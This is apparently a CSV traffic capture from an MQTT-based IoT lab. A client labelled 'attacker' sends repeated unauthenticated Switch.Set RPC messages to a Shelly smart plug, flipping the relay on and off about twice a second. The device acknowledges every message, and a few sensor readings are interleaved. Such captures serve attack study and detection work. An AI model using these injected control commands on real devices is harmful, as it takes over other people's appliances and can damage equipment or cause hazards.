2026-04-22T16:38:21,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:21,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34433.99,""swi"
2026-04-22T16:38:21,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5139 34434.016 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:21,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:21,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5140 34434.498 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:21,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:21,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34434.49,""swi"
2026-04-22T16:38:21,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5141 34434.514 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:22,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5142 34435.001 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:22,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:22,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34435.00,""swi"
2026-04-22T16:38:22,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5143 34435.021 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:22,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5144 34435.507 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:22,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:22,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34435.50,""swi"
2026-04-22T16:38:22,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5145 34435.523 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5146 34436.008 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34436.01,""swi"
2026-04-22T16:38:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5147 34436.028 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5148 34436.509 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34436.51,""swi"
2026-04-22T16:38:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5149 34436.525 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5150 34437.008 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34437.01,""swi"
2026-04-22T16:38:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5151 34437.027 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5152 34437.509 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34437.51,""swi"
2026-04-22T16:38:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5153 34437.525 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5154 34438.019 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34438.02,""swi"
2026-04-22T16:38:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5155 34438.037 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5156 34438.511 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34438.51,""swi"
2026-04-22T16:38:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5157 34438.527 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5158 34439.011 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34439.01,""swi"
2026-04-22T16:38:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5159 34439.030 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5160 34439.511 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34439.51,""swi"
2026-04-22T16:38:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5161 34439.528 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5162 34440.012 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34440.01,""swi"
2026-04-22T16:38:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5163 34440.030 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5164 34440.512 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34440.51,""swi"
2026-04-22T16:38:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5165 34440.529 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5166 34441.013 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34441.01,""swi"
2026-04-22T16:38:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5167 34441.031 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5168 34441.513 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34441.51,""swi"
2026-04-22T16:38:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5169 34441.530 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5170 34442.014 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34442.01,""swi"
2026-04-22T16:38:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5171 34442.032 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5172 34442.514 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34442.51,""swi"
2026-04-22T16:38:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5173 34442.531 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5174 34443.017 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34443.01,""swi"
2026-04-22T16:38:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5175 34443.036 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5176 34443.515 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34443.51,""swi"
2026-04-22T16:38:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5177 34443.532 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5178 34444.016 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34444.01,""swi"
2026-04-22T16:38:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5179 34444.035 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5180 34444.517 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34444.51,""swi"
2026-04-22T16:38:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5181 34444.533 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5182 34445.020 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34445.02,""swi"
2026-04-22T16:38:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5183 34445.039 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5184 34445.524 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34445.52,""swi"
2026-04-22T16:38:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5185 34445.540 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5186 34446.029 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34446.03,""swi"
2026-04-22T16:38:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5187 34446.048 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5188 34446.525 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34446.52,""swi"
2026-04-22T16:38:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5189 34446.541 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5190 34447.025 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
